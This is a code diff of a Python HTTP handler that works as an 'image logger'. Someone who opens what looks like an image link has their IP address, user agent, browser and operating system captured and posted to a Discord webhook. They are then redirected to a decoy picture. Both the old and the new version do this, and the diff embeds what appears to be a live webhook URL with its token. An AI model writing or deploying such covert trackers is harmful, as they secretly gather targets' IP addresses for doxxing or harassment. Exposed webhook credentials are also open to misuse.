@@ -1,51 +1,38 @@
 from http.server import BaseHTTPRequestHandler
+import json
 import requests
 import httpagentparser
-import json
-from urllib.parse import urlparse, parse_qs
+import os
 
-# ================== CONFIG ==================
-WEBHOOK_URL = "https://discord.com/api/webhooks/1490146029503385734/dJHDVdTh11QHFw_ikNw-wpFG3NB8AN02Xl-rGMTn_8ejJxvyTWYyxOhdZ3P3U1tNQ_BV"   # ← CHANGE THIS
-IMAGE_URL   = "https://wallpaperaccess.com/full/2060613.jpg"                                      # ← Change to any image/GIF you want
+# Your Discord webhook—paste it here (keep it secret!)
+WEBHOOK_URL = "https://discord.com/api/webhooks/1490146029503385734/dJHDVdTh11QHFw_ikNw-wpFG3NB8AN02Xl-rGMTn_8ejJxvyTWYyxOhdZ3P3U1tNQ_BV"  # ← CHANGE THIS
+
+# Fake image to serve (change if you want)
+FAKE_IMAGE_URL = "https://gifdb.com/images/high/sad-pikachu-tears-mz567cufi33ij9bg.png"  # or any direct image link
 
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
         try:
-            # Get user info
-            ip = self.headers.get('x-forwarded-for', self.client_address[0])
-            user_agent = self.headers.get('user-agent', 'Unknown')
+            # Grab visitor info
+            ip = self.headers.get('X-Forwarded-For', self.client_address[0])
+            user_agent = self.headers.get('User-Agent', 'Unknown')
             parsed_ua = httpagentparser.detect(user_agent)
 
-            # Log to Discord
-            data = {
-                "content": "**Someone opened the image!**",
-                "embeds": [{
-                    "title": "Image Logger Hit",
-                    "color": 0x00ff00,
-                    "fields": [
-                        {"name": "IP", "value": ip, "inline": True},
-                        {"name": "User-Agent", "value": user_agent[:500], "inline": False},
-                        {"name": "OS", "value": parsed_ua.get('os', {}).get('name', 'Unknown'), "inline": True},
-                        {"name": "Browser", "value": parsed_ua.get('browser', {}).get('name', 'Unknown'), "inline": True},
-                    ],
-                    "timestamp": "now"
-                }]
-            }
+            # Build log message
+            log = f"**New click!**\nIP: `{ip}`\nBrowser: {parsed_ua.get('browser', {}).get('name', 'Unknown')} {parsed_ua.get('browser', {}).get('version', '')}\nOS: {parsed_ua.get('os', {}).get('name', 'Unknown')}\nUA: `{user_agent}`"
 
-            requests.post(WEBHOOK_URL, json=data, timeout=5)
+            # Send to Discord
+            requests.post(WEBHOOK_URL, json={"content": log})
 
-            # Redirect to the real image
+            # Redirect or serve image (Discord likes direct image)
             self.send_response(302)
-            self.send_header('Location', IMAGE_URL)
+            self.send_header('Location', FAKE_IMAGE_URL)
             self.end_headers()
 
         except Exception as e:
-            # Fallback if anything breaks
-            self.send_response(302)
-            self.send_header('Location', IMAGE_URL)
+            self.send_response(500)
             self.end_headers()
+            self.wfile.write(f"Error: {str(e)}".encode())
 
     def do_HEAD(self):
-        self.send_response(200)
-        self.send_header('Content-type', 'image/gif')
-        self.end_headers()
+        self.do_GET()  # For HEAD requests
